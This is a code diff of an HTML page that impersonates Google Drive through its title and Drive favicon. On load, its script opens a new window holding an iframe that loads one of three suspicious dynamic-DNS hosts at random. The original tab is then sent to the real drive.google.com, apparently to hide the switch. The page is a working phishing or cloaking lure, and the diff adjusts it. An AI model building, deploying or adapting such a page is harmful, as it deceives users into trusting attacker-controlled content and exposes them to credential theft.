@@ -6,8 +6,6 @@
   <title>Home - Google Drive</title>
   <!-- Favicon Link from Google Drive -->
   <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png" type="image/x-icon">
-
-
   <script>
     window.onload = function() {
       const fileName = Math.floor(100000 + Math.random() * 900000) + ".html";
@@ -27,11 +25,11 @@
   <iframe id='iframe'></iframe>
   <script>
     const urls = [
-      "https://pluh.root.sx/",
-      "https://somuchpeakk.hotunix.com/",
-      "https://huawaakiskokoa.duckdns.org/"
+      'https://pluh.root.sx/',
+      'https://somuchpeakk.hotunix.com/',
+      'https://huawaakiskokoa.duckdns.org/'
     ];
-    document.getElementById("iframe").src = urls[Math.floor(Math.random() * urls.length)];
+    document.getElementById('iframe').src = urls[Math.floor(Math.random() * urls.length)];
   <\/script>
 </body>
 </html>`;
@@ -40,9 +38,11 @@
       const newWindow = window.open();
       newWindow.document.write(content);
 
-      // Close the original window
-      window.close();
+      // Close the original window (this should work if this page was opened via window.open())
+      window.location.href = "https://drive.google.com/drive/";
     };
   </script>
+</head>
+<body>
 </body>
 </html>
